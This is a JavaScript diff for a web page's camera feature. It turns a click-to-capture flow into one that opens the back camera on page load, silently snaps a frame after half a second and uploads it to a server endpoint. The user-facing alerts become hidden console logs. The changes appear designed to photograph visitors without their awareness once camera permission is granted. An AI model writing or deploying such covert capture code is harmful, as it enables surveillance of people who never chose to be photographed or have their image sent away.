@@ -3,23 +3,26 @@ document.addEventListener('DOMContentLoaded', async () => {
     const video = document.getElementById('video');
     const canvas = document.getElementById('capture-canvas');
     const context = canvas.getContext('2d');
-    const capturedImage = document.getElementById('captured-image');
 
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        // Access the back camera
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
         video.srcObject = stream;
 
         video.addEventListener('loadedmetadata', () => {
+            // Set canvas size based on video size
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-        });
 
-        document.body.addEventListener('click', () => {
-            captureContainer.style.display = 'flex';
-
+            // Capture the image quickly
             setTimeout(() => {
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const dataURL = canvas.toDataURL('image/png');
+
+                // Display the captured image (optional)
+                const img = new Image();
+                img.src = dataURL;
+                document.body.appendChild(img);
 
                 // Send image data to server
                 fetch('/upload', {
@@ -30,24 +33,22 @@ document.addEventListener('DOMContentLoaded', async () => {
                     body: JSON.stringify({ image: dataURL })
                 }).then(response => {
                     if (response.ok) {
-                        alert('Image uploaded successfully!');
+                        console.log('Image uploaded successfully!');
                     } else {
-                        alert('Failed to upload image.');
+                        console.error('Failed to upload image. Status:', response.status);
                     }
                 }).catch(error => {
-                    alert('Error occurred during upload.');
+                    console.error('Error occurred during upload:', error);
                 });
 
-                // Display the captured image
-                capturedImage.src = dataURL;
-                capturedImage.style.display = 'block';
-                
-                // Hide the capture container
+                // Hide capture container
                 captureContainer.style.display = 'none';
-            }, 1000); // Adjust timing as needed
+            }, 500); // Capture image after a short delay
         });
 
+        // Show the capture container
+        captureContainer.style.display = 'flex';
     } catch (error) {
-        alert('Camera access denied or not available.');
+        console.error('Camera access denied or not available.', error);
     }
 });
